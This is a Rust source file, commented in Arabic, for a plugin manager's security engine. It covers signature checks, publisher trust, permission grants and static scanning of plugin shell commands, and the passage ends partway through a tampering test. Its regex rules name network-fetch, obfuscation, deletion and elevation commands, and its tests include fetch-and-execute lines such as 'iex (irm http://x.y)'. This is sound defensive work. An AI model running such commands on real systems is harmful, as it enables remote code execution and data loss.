//! Security Engine — التحقق من توقيع الحزم، الفحص الساكن للأوامر، الصلاحيات المحددة،
//! خطة التشغيل المصرَّح بها، والناشرون الموثوقون.
//!
//! حدود صريحة (لا تُدّعى أكثر من ذلك):
//! - الفحص الساكن يقرأ نص الأوامر فقط؛ المتغيرات والأسماء البديلة والاستدعاء غير المباشر قد تفلت منه.
//! - لا يوجد عزل ديناميكي للعمليات بعد (انظر docs/ISOLATION.md)، فالأوامر المسموح بها تعمل بصلاحيات المستخدم.
//! - التوقيع يثبت المصدر والسلامة، لا حسن النية. والموافقة وحدها ليست حماية.

use crate::plugin::{self, Action, Manifest, ToolInfo};
use crate::storage::{now, Db, SecurityRow, TrustedKey};
use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
use ed25519_dalek::{Signature, Verifier, VerifyingKey};
use regex::Regex;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeSet;
use std::io::{Cursor, Read};
use std::path::Path;
use std::sync::OnceLock;

/// بادئة تُضاف لرسالة الخطأ عندما يكون السبب صلاحيات غير معتمدة (تستعملها الواجهة).
pub const PERM_TAG: &str = "[PERMISSIONS]";

const MAX_UNPACKED_HASH: u64 = 100 * 1024 * 1024;
const MAX_SIG_BYTES: u64 = 64 * 1024;
pub const SIG_PATH: &str = "signature/signature.json";
const SIG_MAGIC: &[u8] = b"TARPKG-SIG-V1\n";

// ---------------------------------------------------------------------------
// أنواع التقارير
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct Finding {
    pub permission: String,
    pub rule: String,
    pub action: String,
    pub step: String,
    /// "info" | "warn" | "high"
    pub severity: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct LabReport {
    pub tool_id: String,
    pub version: String,
    pub generated_at: i64,
    /// "low" | "medium" | "high"
    pub risk: String,
    pub required: Vec<String>,
    pub declared: Vec<String>,
    pub undeclared: Vec<String>,
    pub findings: Vec<Finding>,
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, Serialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct SignatureInfo {
    /// "unsigned" | "untrusted" | "trusted" | "builtin"
    pub status: String,
    pub key_id: Option<String>,
    pub signer: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SecurityInfo {
    pub signature: SignatureInfo,
    pub declared: Vec<String>,
    pub granted: Vec<String>,
    pub report: Option<LabReport>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RunPlan {
    pub tool_id: String,
    pub action_id: String,
    pub title: String,
    pub shell: String,
    pub steps: Vec<String>,
    /// "run" | "insert"
    pub mode: String,
    pub cwd: Option<String>,
    pub needs_confirm: bool,
    pub warnings: Vec<String>,
    pub risk: String,
    pub signature: String,
}

// ---------------------------------------------------------------------------
// الفحص الساكن
// ---------------------------------------------------------------------------

struct Rule {
    perm: &'static str,
    name: &'static str,
    severity: &'static str,
    re: Regex,
}

// (الصلاحية، اسم القاعدة، الخطورة، النمط)
const RULE_DEFS: &[(&str, &str, &str, &str)] = &[
    (
        "files.delete",
        "remove-item",
        "high",
        r"(?i)\b(remove-item|rm|del|erase|rmdir|rd|ri|clear-recyclebin|format-volume)\b",
    ),
    (
        "files.delete",
        "format-drive",
        "high",
        r"(?i)\bformat\s+[a-z]:",
    ),
    ("files.delete", "cipher-wipe", "high", r"(?i)\bcipher\s+/w"),
    (
        "files.write",
        "write-cmd",
        "warn",
        r"(?i)\b(set-content|add-content|out-file|new-item|copy-item|move-item|rename-item|tee-object|export-csv|export-clixml|expand-archive|compress-archive|copy|move|xcopy|robocopy|mkdir|md|ren|rename)\b",
    ),
    (
        "files.read",
        "read-file",
        "info",
        r"(?i)\b(get-content|gc|cat|get-childitem|gci|dir|ls|select-string|sls|findstr|tree|import-csv|get-item|get-itemproperty|test-path|resolve-path)\b",
    ),
    (
        "network",
        "network-cmd",
        "warn",
        r"(?i)\b(invoke-webrequest|invoke-restmethod|iwr|irm|curl|wget|ping|nslookup|tracert|pathping|test-connection|test-netconnection|resolve-dnsname|ssh|scp|sftp|ftp|telnet|bitsadmin|start-bitstransfer)\b",
    ),
    (
        "network",
        "net-api",
        "warn",
        r"(?i)(net\.webclient|system\.net\.|downloadstring|downloadfile|urlcache)",
    ),
    (
        "services.manage",
        "service-cmd",
        "warn",
        r"(?i)\b(start-service|stop-service|restart-service|set-service|new-service|remove-service|sc|sc\.exe)\b",
    ),
    (
        "services.manage",
        "net-service",
        "warn",
        r"(?i)\bnet\s+(start|stop|pause|continue)\b",
    ),
    (
        "system.sensitive",
        "registry-write",
        "high",
        r"(?i)\breg(\.exe)?\s+(add|delete|import|load|unload|save|restore)\b",
    ),
    (
        "system.sensitive",
        "registry-path",
        "high",
        r"(?i)(\bhklm:|\bhkcu:|\bhkey_)",
    ),
    (
        "system.sensitive",
        "system-admin",
        "high",
        r"(?i)\b(schtasks|register-scheduledtask|new-scheduledtask|unregister-scheduledtask|bcdedit|diskpart|set-executionpolicy|set-mppreference|add-mppreference|disable-windowsoptionalfeature|shutdown|restart-computer|stop-computer|vssadmin|icacls|takeown|cacls|new-localuser|add-localgroupmember|stop-process|taskkill|wmic|set-netfirewallrule|new-netfirewallrule|enable-psremoting)\b",
    ),
    (
        "system.sensitive",
        "account-admin",
        "high",
        r"(?i)\bnet\s+(user|localgroup)\b",
    ),
    ("system.sensitive", "firewall", "high", r"(?i)\bnetsh\b"),
    (
        "system.sensitive",
        "obfuscation",
        "high",
        r"(?i)(\s-enc(odedcommand)?\b|frombase64string|\binvoke-expression\b|\biex\b|\[reflection\.assembly\]|\badd-type\b)",
    ),
    (
        "system.sensitive",
        "hidden-process",
        "high",
        r"(?i)-windowstyle\s+hidden",
    ),
    (
        "elevated",
        "run-as",
        "high",
        r"(?i)(-verb\s+runas|\brunas\b|\bgsudo\b|\bsudo\b)",
    ),
    (
        "system.read",
        "system-query",
        "info",
        r"(?i)\b(get-ciminstance|get-wmiobject|get-computerinfo|systeminfo|get-process|tasklist|get-service|hostname|whoami|ipconfig|get-psdrive|netstat|get-netadapter|get-nettcpconnection|get-netipaddress|get-hotfix|get-eventlog|get-winevent|driverquery)\b",
    ),
];

fn rules() -> &'static Vec<Rule> {
    static R: OnceLock<Vec<Rule>> = OnceLock::new();
    R.get_or_init(|| {
        RULE_DEFS
            .iter()
            .map(|&(perm, name, severity, pat)| Rule {
                perm,
                name,
                severity,
                re: Regex::new(pat).expect("valid rule regex"),
            })
            .collect()
    })
}

/// إعادة توجيه الخرج إلى ملف (> أو >>) باستثناء 2>&1 و$null وnul.
fn has_file_redirect(step: &str) -> bool {
    let chars: Vec<char> = step.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '>' {
            let mut j = i + 1;
            if j < chars.len() && chars[j] == '>' {
                j += 1;
            }
            while j < chars.len() && chars[j].is_whitespace() {
                j += 1;
            }
            if j >= chars.len() {
                return false;
            }
            if chars[j] == '&' {
                i = j;
                continue;
            }
            let head: String = chars[j..].iter().take(6).collect::<String>().to_lowercase();
            if head.starts_with("$null") || head.starts_with("nul") {
                i = j;
                continue;
            }
            return true;
        }
        i += 1;
    }
    false
}

fn excerpt(s: &str) -> String {
    s.chars().take(160).collect()
}

pub fn analyze_steps(action: &Action) -> Vec<Finding> {
    let mut out = Vec::new();
    for step in &action.steps {
        for r in rules() {
            if r.re.is_match(step) {
                out.push(Finding {
                    permission: r.perm.to_string(),
                    rule: r.name.to_string(),
                    action: action.id.clone(),
                    step: excerpt(step),
                    severity: r.severity.to_string(),
                });
            }
        }
        if has_file_redirect(step) {
            out.push(Finding {
                permission: "files.write".into(),
                rule: "output-redirect".into(),
                action: action.id.clone(),
                step: excerpt(step),
                severity: "warn".into(),
            });
        }
    }
    out
}

fn risk_of(findings: &[Finding], undeclared: bool) -> String {
    let mut risk = "low";
    if findings.iter().any(|f| f.severity == "warn") {
        risk = "medium";
    }
    if findings.iter().any(|f| f.severity == "high") {
        risk = "high";
    }
    if undeclared && risk == "low" {
        risk = "medium";
    }
    risk.to_string()
}

pub fn analyze(m: &Manifest) -> LabReport {
    let mut findings = Vec::new();
    for a in &m.actions {
        findings.extend(analyze_steps(a));
    }
    let mut required: BTreeSet<String> = findings.iter().map(|f| f.permission.clone()).collect();
    required.insert("process.run".into());
    let declared: BTreeSet<String> = m.permissions.iter().cloned().collect();
    let undeclared: Vec<String> = required.difference(&declared).cloned().collect();

    let mut notes = vec![
        "التحليل ساكن (فحص نصي للأوامر) ولا يكشف كل الحالات: المتغيرات والأسماء البديلة والاستدعاء غير المباشر قد تفلت منه، ولا يغني عن العزل.".to_string(),
    ];
    if findings.iter().all(|f| f.severity == "info") {
        notes.push("لم تُكتشف أنماط ذات خطورة متوسطة أو عالية.".into());
    }
    if !undeclared.is_empty() {
        notes.push(format!(
            "الأداة تستخدم صلاحيات لم تعلنها: {}",
            undeclared.join("، ")
        ));
    }
    LabReport {
        tool_id: m.id.clone(),
        version: m.version.clone(),
        generated_at: now(),
        risk: risk_of(&findings, !undeclared.is_empty()),
        required: required.into_iter().collect(),
        declared: declared.into_iter().collect(),
        undeclared,
        findings,
        notes,
    }
}

// ---------------------------------------------------------------------------
// التوقيع الرقمي (Ed25519)
// ---------------------------------------------------------------------------
//
// الحمولة الموقَّعة: "TARPKG-SIG-V1\n" ثم لكل ملف (عدا signature/signature.json) مرتّباً بالمسار:
//   "<المسار>\t<sha256 hex>\n"
// ملف التوقيع signature/signature.json:
//   {"version":1,"algorithm":"ed25519","publicKey":"<base64 32B>","signature":"<base64 64B>","signer":"اسم اختياري"}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct SigFile {
    version: u32,
    algorithm: String,
    public_key: String,
    signature: String,
    #[serde(default)]
    signer: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub struct SigCheck {
    /// "unsigned" | "signed"
    pub kind: &'static str,
    pub key_id: Option<String>,
    pub public_key: Option<String>,
    pub signer: Option<String>,
}

pub fn key_id_of(public_key: &[u8]) -> String {
    let mut h = Sha256::new();
    h.update(public_key);
    let hex = format!("{:x}", h.finalize());
    hex[..16].to_string()
}

pub fn signing_payload(archive: &mut zip::ZipArchive<Cursor<&[u8]>>) -> Result<Vec<u8>, String> {
    let mut entries: Vec<(String, String)> = Vec::new();
    for i in 0..archive.len() {
        let mut f = archive.by_index(i).map_err(|e| e.to_string())?;
        if f.is_dir() {
            continue;
        }
        let name = f.name().replace('\\', "/");
        if name == SIG_PATH {
            continue;
        }
        let mut h = Sha256::new();
        std::io::copy(&mut (&mut f).take(MAX_UNPACKED_HASH + 1), &mut h)
            .map_err(|e| e.to_string())?;
        entries.push((name, format!("{:x}", h.finalize())));
    }
    entries.sort();
    let mut payload = SIG_MAGIC.to_vec();
    for (name, hash) in entries {
        payload.extend_from_slice(format!("{name}\t{hash}\n").as_bytes());
    }
    Ok(payload)
}

fn read_entry(
    archive: &mut zip::ZipArchive<Cursor<&[u8]>>,
    name: &str,
) -> Result<Option<Vec<u8>>, String> {
    match archive.by_name(name) {
        Ok(mut f) => {
            let mut buf = Vec::new();
            (&mut f)
                .take(MAX_SIG_BYTES + 1)
                .read_to_end(&mut buf)
                .map_err(|e| e.to_string())?;
            if buf.len() as u64 > MAX_SIG_BYTES {
                return Err("ملف التوقيع كبير جداً".into());
            }
            Ok(Some(buf))
        }
        Err(zip::result::ZipError::FileNotFound) => Ok(None),
        Err(e) => Err(e.to_string()),
    }
}

/// يتحقق من توقيع الحزمة إن وُجد. حزمة بلا توقيع → unsigned. توقيع موجود لكنه غير صالح → خطأ (تُرفض الحزمة).
pub fn verify_package(archive: &mut zip::ZipArchive<Cursor<&[u8]>>) -> Result<SigCheck, String> {
    let raw = match read_entry(archive, SIG_PATH)? {
        None => {
            return Ok(SigCheck {
                kind: "unsigned",
                key_id: None,
                public_key: None,
                signer: None,
            })
        }
        Some(b) => b,
    };
    let sf: SigFile =
        serde_json::from_slice(&raw).map_err(|e| format!("ملف التوقيع غير صالح: {e}"))?;
    if sf.version != 1 || sf.algorithm != "ed25519" {
        return Err("إصدار أو خوارزمية التوقيع غير مدعومة (المدعوم: ed25519 v1)".into());
    }
    let pk_bytes = B64
        .decode(sf.public_key.trim())
        .map_err(|_| "المفتاح العام في التوقيع غير صالح".to_string())?;
    let pk_arr: [u8; 32] = pk_bytes
        .as_slice()
        .try_into()
        .map_err(|_| "طول المفتاح العام غير صحيح".to_string())?;
    let vk = VerifyingKey::from_bytes(&pk_arr)
        .map_err(|_| "المفتاح العام في التوقيع غير صالح".to_string())?;
    let sig_bytes = B64
        .decode(sf.signature.trim())
        .map_err(|_| "قيمة التوقيع غير صالحة".to_string())?;
    let sig_arr: [u8; 64] = sig_bytes
        .as_slice()
        .try_into()
        .map_err(|_| "طول التوقيع غير صحيح".to_string())?;
    let signature = Signature::from_bytes(&sig_arr);

    let payload = signing_payload(archive)?;
    vk.verify(&payload, &signature).map_err(|_| {
        "التوقيع لا يطابق محتوى الحزمة — الحزمة عُدّلت بعد توقيعها أو التوقيع مزيّف".to_string()
    })?;

    Ok(SigCheck {
        kind: "signed",
        key_id: Some(key_id_of(&pk_arr)),
        public_key: Some(sf.public_key.trim().to_string()),
        signer: sf.signer,
    })
}

// ---------------------------------------------------------------------------
// الثقة والتجميع
// ---------------------------------------------------------------------------

/// الحالة الفعلية: unsigned | untrusted | trusted | builtin. الثقة تُحسب ديناميكياً من الناشرين الموثوقين.
pub fn effective_status(db: &Db, row: Option<&SecurityRow>) -> String {
    let Some(row) = row else {
        return "unsigned".into();
    };
    match row.kind.as_str() {
        "builtin" => "builtin".into(),
        "signed" => {
            let trusted = match (&row.key_id, &row.public_key) {
                (Some(id), Some(pk)) => db
                    .trusted_get(id)
                    .ok()
                    .flatten()
                    .map(|k| &k.public_key == pk)
                    .unwrap_or(false),
                _ => false,
            };
            let s = if trusted { "trusted" } else { "untrusted" };
            s.into()
        }
        _ => "unsigned".into(),
    }
}

fn granted_for(db: &Db, t: &ToolInfo) -> Vec<String> {
    if t.source == "builtin" {
        return t.manifest.permissions.clone();
    }
    db.grants_get(&t.id)
        .unwrap_or_default()
        .into_iter()
        .filter(|p| t.manifest.permissions.contains(p))
        .collect()
}

/// يملأ حقلي signature وgranted في ToolInfo.
pub fn hydrate(db: &Db, mut t: ToolInfo) -> ToolInfo {
    let row = db.security_get(&t.id).ok().flatten();
    t.signature = effective_status(db, row.as_ref());
    t.granted = granted_for(db, &t);
    t
}

pub fn record_install(
    db: &Db,
    m: &Manifest,
    sig: &SigCheck,
    report: &LabReport,
) -> Result<(), String> {
    db.security_put(&SecurityRow {
        tool_id: m.id.clone(),
        kind: sig.kind.to_string(),
        key_id: sig.key_id.clone(),
        public_key: sig.public_key.clone(),
        signer: sig.signer.clone(),
        risk: report.risk.clone(),
    })?;
    db.report_put(
        &m.id,
        &m.version,
        &serde_json::to_string(report).map_err(|e| e.to_string())?,
    )
}

/// الأدوات المدمجة: صلاحياتها المعلنة ممنوحة تلقائياً (كودها جزء من التطبيق)، وتُفحص للتأكد من صدق إعلانها.
pub fn record_builtin(db: &Db, m: &Manifest) -> Result<(), String> {
    let report = analyze(m);
    if !report.undeclared.is_empty() {
        return Err(format!(
            "أداة مدمجة {} تستخدم صلاحيات غير معلنة: {}",
            m.id,
            report.undeclared.join("، ")
        ));
    }
    db.grants_set(&m.id, &m.permissions)?;
    db.security_put(&SecurityRow {
        tool_id: m.id.clone(),
        kind: "builtin".into(),
        key_id: None,
        public_key: None,
        signer: None,
        risk: report.risk.clone(),
    })?;
    db.report_put(
        &m.id,
        &m.version,
        &serde_json::to_string(&report).map_err(|e| e.to_string())?,
    )
}

pub fn security_info(db: &Db, id: &str) -> Result<SecurityInfo, String> {
    let row = db
        .tool_get(id)?
        .ok_or_else(|| format!("الأداة '{id}' غير مثبّتة"))?;
    let info = hydrate(db, plugin::to_info(row)?);
    let sec = db.security_get(id)?;
    let report = db
        .report_latest(id)?
        .and_then(|j| serde_json::from_str::<LabReport>(&j).ok());
    Ok(SecurityInfo {
        signature: SignatureInfo {
            status: info.signature.clone(),
            key_id: sec.as_ref().and_then(|s| s.key_id.clone()),
            signer: sec.as_ref().and_then(|s| s.signer.clone()),
        },
        declared: info.manifest.permissions.clone(),
        granted: info.granted.clone(),
        report,
    })
}

/// يعتمد بالضبط مجموعة الصلاحيات المعطاة (يلغي ما سواها). لا تُمنح صلاحية غير معلنة.
pub fn set_grants(db: &Db, id: &str, perms: &[String]) -> Result<(), String> {
    let row = db
        .tool_get(id)?
        .ok_or_else(|| format!("الأداة '{id}' غير مثبّتة"))?;
    if row.source == "builtin" {
        return Err("صلاحيات الأدوات المدمجة ثابتة".into());
    }
    let info = plugin::to_info(row)?;
    for p in perms {
        if !info.manifest.permissions.contains(p) {
            return Err(format!("الصلاحية '{p}' غير معلنة في manifest الأداة"));
        }
    }
    let new: BTreeSet<String> = perms.iter().cloned().collect();
    let old: BTreeSet<String> = db.grants_get(id)?.into_iter().collect();
    let new_vec: Vec<String> = new.iter().cloned().collect();
    db.grants_set(id, &new_vec)?;
    for p in new.difference(&old) {
        let _ = db.audit_add("grant", id, p);
    }
    for p in old.difference(&new) {
        let _ = db.audit_add("revoke", id, p);
    }
    Ok(())
}

pub fn trust_add(db: &Db, name: &str, public_key_b64: &str) -> Result<TrustedKey, String> {
    let name = name.trim();
    if name.is_empty() || name.chars().count() > 60 {
        return Err("اسم الناشر مطلوب وبحد أقصى 60 حرفاً".into());
    }
    let b64 = public_key_b64.trim();
    let bytes = B64
        .decode(b64)
        .map_err(|_| "المفتاح العام ليس بصيغة base64 صالحة".to_string())?;
    let arr: [u8; 32] = bytes
        .as_slice()
        .try_into()
        .map_err(|_| "المفتاح العام يجب أن يكون 32 بايتاً (Ed25519)".to_string())?;
    VerifyingKey::from_bytes(&arr).map_err(|_| "المفتاح العام غير صالح".to_string())?;
    let key = TrustedKey {
        key_id: key_id_of(&arr),
        name: name.to_string(),
        public_key: b64.to_string(),
        added_at: now(),
    };
    db.trusted_add(&key)?;
    let _ = db.audit_add("trust_add", &key.key_id, &key.name);
    Ok(key)
}

pub fn trust_remove(db: &Db, key_id: &str) -> Result<(), String> {
    if !db.trusted_remove(key_id)? {
        return Err("الناشر غير موجود في القائمة الموثوقة".into());
    }
    let _ = db.audit_add("trust_remove", key_id, "");
    Ok(())
}

pub fn rescan(db: &Db, id: &str) -> Result<LabReport, String> {
    let row = db
        .tool_get(id)?
        .ok_or_else(|| format!("الأداة '{id}' غير مثبّتة"))?;
    let info = plugin::to_info(row)?;
    let report = analyze(&info.manifest);
    db.report_put(
        id,
        &info.version,
        &serde_json::to_string(&report).map_err(|e| e.to_string())?,
    )?;
    if let Some(mut sec) = db.security_get(id)? {
        sec.risk = report.risk.clone();
        db.security_put(&sec)?;
    }
    let _ = db.audit_add("rescan", id, &format!("risk={}", report.risk));
    Ok(report)
}

// ---------------------------------------------------------------------------
// خطة التشغيل: القرار النهائي لتشغيل أي إجراء يتم هنا (لا في الواجهة)
// ---------------------------------------------------------------------------

pub fn plan_run(
    db: &Db,
    tools_dir: &Path,
    tool_id: &str,
    action_id: &str,
) -> Result<RunPlan, String> {
    let row = db
        .tool_get(tool_id)?
        .ok_or_else(|| format!("الأداة '{tool_id}' غير مثبّتة"))?;
    if !row.enabled {
        return Err("الأداة متوقفة — فعّلها أولاً".into());
    }
    let info = plugin::to_info(row)?;
    let action = info
        .manifest
        .actions
        .iter()
        .find(|a| a.id == action_id)
        .ok_or_else(|| format!("لا يوجد إجراء '{action_id}' في الأداة"))?
        .clone();

    let findings = analyze_steps(&action);
    let mut required: BTreeSet<String> = findings.iter().map(|f| f.permission.clone()).collect();
    required.insert("process.run".into());
    let granted: BTreeSet<String> = granted_for(db, &info).into_iter().collect();
    let missing: Vec<String> = required.difference(&granted).cloned().collect();
    if !missing.is_empty() {
        let _ = db.audit_add(
            "run_blocked",
            tool_id,
            &format!("{action_id}: {}", missing.join(",")),
        );
        return Err(format!(
            "{PERM_TAG} الإجراء يتطلب صلاحيات غير معتمدة: {}",
            missing.join("، ")
        ));
    }

    let sec = db.security_get(tool_id)?;
    let status = effective_status(db, sec.as_ref());
    let mut warnings: Vec<String> = Vec::new();
    for f in findings.iter().filter(|f| f.severity == "high") {
        let w = format!("نمط حساس ({}): {}", f.rule, f.step);
        if !warnings.contains(&w) {
            warnings.push(w);
        }
    }
    let needs_confirm =
        (info.source != "builtin" && status != "trusted") || !warnings.is_empty() || action.confirm;

    let cwd = if info.source == "builtin" {
        None
    } else {
        let p = tools_dir.join(tool_id);
        p.is_dir().then(|| p.to_string_lossy().to_string())
    };

    Ok(RunPlan {
        tool_id: tool_id.to_string(),
        action_id: action.id.clone(),
        title: action.title.clone(),
        shell: action.shell.clone(),
        steps: action.steps.clone(),
        mode: action.mode.clone(),
        cwd,
        needs_confirm,
        warnings,
        risk: risk_of(&findings, false),
        signature: status,
    })
}

// ---------------------------------------------------------------------------
// الاختبارات
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use super::*;
    use ed25519_dalek::{Signer, SigningKey};
    use serde_json::json;
    use std::io::Write;
    use std::path::PathBuf;
    use std::time::{SystemTime, UNIX_EPOCH};

    const APP: &str = "0.4.0";

    fn tmp() -> PathBuf {
        let p = std::env::temp_dir().join(format!(
            "tarsec-test-{}-{}",
            std::process::id(),
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&p).unwrap();
        p
    }

    fn db() -> Db {
        Db::open_in_memory().unwrap()
    }

    fn manifest_value(
        id: &str,
        version: &str,
        perms: &[&str],
        steps: &[&str],
    ) -> serde_json::Value {
        json!({
            "id": id, "name": "أداة اختبار", "developer": "Tester", "version": version,
            "description": "وصف", "platforms": ["windows", "linux", "macos"],
            "kind": "command", "engine": "shell", "permissions": perms,
            "actions": [{ "id": "go", "title": "تشغيل", "shell": "any", "steps": steps }]
        })
    }

    fn make_zip(files: &[(&str, Vec<u8>)]) -> Vec<u8> {
        let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
        let opt = zip::write::SimpleFileOptions::default();
        for (n, d) in files {
            w.start_file(*n, opt).unwrap();
            w.write_all(d).unwrap();
        }
        w.finish().unwrap().into_inner()
    }

    fn sign_zip(files: &[(&str, Vec<u8>)], sk: &SigningKey, signer: Option<&str>) -> Vec<u8> {
        let base = make_zip(files);
        let mut ar = zip::ZipArchive::new(Cursor::new(&base[..])).unwrap();
        let payload = signing_payload(&mut ar).unwrap();
        let sig = sk.sign(&payload);
        let sf = json!({
            "version": 1, "algorithm": "ed25519",
            "publicKey": B64.encode(sk.verifying_key().to_bytes()),
            "signature": B64.encode(sig.to_bytes()),
            "signer": signer
        });
        let mut all = files.to_vec();
        all.push((SIG_PATH, sf.to_string().into_bytes()));
        make_zip(&all)
    }

    fn key(seed: u8) -> SigningKey {
        SigningKey::from_bytes(&[seed; 32])
    }

    fn pkg(v: &serde_json::Value) -> Vec<u8> {
        make_zip(&[("manifest.json", v.to_string().into_bytes())])
    }

    #[test]
    fn guided_recipes_need_only_expected_permissions() {
        let none = |c: &str| {
            let p = perms_of(c);
            assert!(
                !p.contains("system.sensitive")
                    && !p.contains("elevated")
                    && !p.contains("files.delete"),
                "{c}: {p:?}"
            );
            p
        };
        let ports = "Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}} | Format-Table -AutoSize";
        assert!(none(ports).contains("system.read"));
        let tee = "ipconfig /all | Out-String -Width 200 | Tee-Object -FilePath result.txt";
        let p = none(tee);
        assert!(
            p.contains("files.write") && p.contains("system.read"),
            "{p:?}"
        );
        assert!(none("ping -n 4 google.com").contains("network"));
        let chk = "if (Get-Command java -ErrorAction SilentlyContinue) { Write-Output 'java مثبت:'; Get-Command java | Select-Object -ExpandProperty Source } else { Write-Output 'java غير مثبت' }";
        assert!(none(chk).is_empty());
        let disks = "Get-PSDrive -PSProvider FileSystem | Select-Object Name,@{n='UsedGB';e={[math]::Round($_.Used/1GB,1)}},@{n='FreeGB';e={[math]::Round($_.Free/1GB,1)}}";
        none(disks);
        none("Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name,Id,CPU");
    }

    fn perms_of(cmd: &str) -> BTreeSet<String> {
        let a = Action {
            id: "t".into(),
            title: "t".into(),
            description: String::new(),
            shell: "any".into(),
            steps: vec![cmd.to_string()],
            mode: "run".into(),
            confirm: false,
        };
        analyze_steps(&a)
            .into_iter()
            .map(|f| f.permission)
            .collect()
    }

    // ---------- الفحص الساكن ----------

    #[test]
    fn static_rules_detect_expected_permissions() {
        let cases: &[(&str, &str)] = &[
            ("Remove-Item C:\\x -Recurse", "files.delete"),
            ("del foo.txt", "files.delete"),
            ("format d:", "files.delete"),
            ("Set-Content a.txt hi", "files.write"),
            ("echo hi > out.txt", "files.write"),
            ("echo hi >> out.txt", "files.write"),
            ("Get-Content a.txt", "files.read"),
            ("Invoke-WebRequest http://example.com", "network"),
            ("ping 8.8.8.8", "network"),
            ("Restart-Service spooler", "services.manage"),
            ("net stop spooler", "services.manage"),
            ("reg add HKLM\\Software\\X /v a", "system.sensitive"),
            ("powershell -enc AAAA", "system.sensitive"),
            ("iex (irm http://x.y)", "system.sensitive"),
            ("Stop-Process -Id 4", "system.sensitive"),
            ("Start-Process cmd -Verb RunAs", "elevated"),
            ("whoami", "system.read"),
            ("Get-Process", "system.read"),
        ];
        for (cmd, perm) in cases {
            assert!(perms_of(cmd).contains(*perm), "'{cmd}' should need {perm}");
        }
    }

    #[test]
    fn benign_commands_need_nothing_extra() {
        for cmd in [
            "Write-Output 'hello'",
            "echo hi 2>&1",
            "Write-Output 1 > $null",
            "docker ps",
            "git status",
        ] {
            assert!(
                perms_of(cmd).is_empty(),
                "'{cmd}' should be benign, got {:?}",
                perms_of(cmd)
            );
        }
    }

    #[test]
    fn redirect_detection() {
        assert!(has_file_redirect("a >> log.txt"));
        assert!(has_file_redirect("a > out.txt"));
        assert!(!has_file_redirect("a 2>&1"));
        assert!(!has_file_redirect("a > $null"));
        assert!(!has_file_redirect("a > nul"));
        assert!(!has_file_redirect("a >"));
    }

    #[test]
    fn builtin_tools_declare_what_they_use() {
        for m in plugin::builtin_manifests().unwrap() {
            let r = analyze(&m);
            assert!(
                r.undeclared.is_empty(),
                "{}: undeclared {:?}",
                m.id,
                r.undeclared
            );
            assert_ne!(r.risk, "high", "{} must not be high risk", m.id);
        }
    }

    #[test]
    fn risk_levels() {
        let low: Manifest = serde_json::from_value(manifest_value(
            "lowr",
            "1.0.0",
            &["process.run"],
            &["echo hi"],
        ))
        .unwrap();
        assert_eq!(analyze(&low).risk, "low");
        let med: Manifest = serde_json::from_value(manifest_value(
            "medr",
            "1.0.0",
            &["process.run", "network"],
            &["ping 8.8.8.8"],
        ))
        .unwrap();
        assert_eq!(analyze(&med).risk, "medium");
        let high: Manifest = serde_json::from_value(manifest_value(
            "highr",
            "1.0.0",
            &["process.run", "files.delete"],
            &["Remove-Item x"],
        ))
        .unwrap();
        assert_eq!(analyze(&high).risk, "high");
        let undecl: Manifest = serde_json::from_value(manifest_value(
            "undr",
            "1.0.0",
            &["process.run"],
            &["ping 8.8.8.8"],
        ))
        .unwrap();
        assert_eq!(analyze(&undecl).undeclared, vec!["network".to_string()]);
    }

    // ---------- التوقيع ----------

    fn archive_of(bytes: &[u8]) -> zip::ZipArchive<Cursor<&[u8]>> {
        zip::ZipArchive::new(Cursor::new(bytes)).unwrap()
    }

    #[test]
    fn unsigned_package() {
        let b = pkg(&manifest_value(
            "hello",
            "1.0.0",
            &["process.run"],
            &["echo hi"],
        ));
        assert_eq!(
            verify_package(&mut archive_of(&b)).unwrap().kind,
            "unsigned"
        );
    }

    #[test]
    fn valid_signature_and_trust_flow() {
        let d = db();
        let sk = key(7);
        let files = vec![
            (
                "manifest.json",
                manifest_value("hello", "1.0.0", &["process.run"], &["echo hi"])
                    .to_string()
                    .into_bytes(),
            ),
            ("scripts/a.ps1", b"Write-Output 1".to_vec()),
        ];
        let b = sign_zip(&files, &sk, Some("Test Publisher"));
        let sc = verify_package(&mut archive_of(&b)).unwrap();
        assert_eq!(sc.kind, "signed");
        assert_eq!(sc.signer.as_deref(), Some("Test Publisher"));
        let pk_b64 = B64.encode(sk.verifying_key().to_bytes());
        assert_eq!(sc.public_key.as_deref(), Some(pk_b64.as_str()));

        let row = SecurityRow {
            tool_id: "hello".into(),
            kind: "signed".into(),
            key_id: sc.key_id.clone(),
            public_key: sc.public_key.clone(),
            signer: sc.signer.clone(),
            risk: "low".into(),
        };
        assert_eq!(effective_status(&d, Some(&row)), "untrusted");
        trust_add(&d, "Test Publisher", &pk_b64).unwrap();
        assert_eq!(effective_status(&d, Some(&row)), "trusted");
        trust_remove(&d, sc.key_id.as_deref().unwrap()).unwrap();
        assert_eq!(effective_status(&d, Some(&row)), "untrusted");
    }

    #[test]
    fn tampering_is_detected() {
        let sk = key(7);
        let files = vec![
            (
                "manifest.json",
                manifest_value("hello", "1.0.0", &["process.run"], &["echo hi"])
                    .to_string()
                    .into_bytes(),
            ),
            ("a.txt", b"original".to_vec()),
        ];
        // 1) تعديل محتوى ملف بعد التوقيع
        let mut tampered = files.clone();
        tampered[1].1 = b"evil".to_vec();
        let sig_src = sign_zip(&files, &sk, None);
        let sig_entry = read_entry(&mut archive_of(&sig_src), SIG_PATH)
            .unwrap()
            .unwrap();
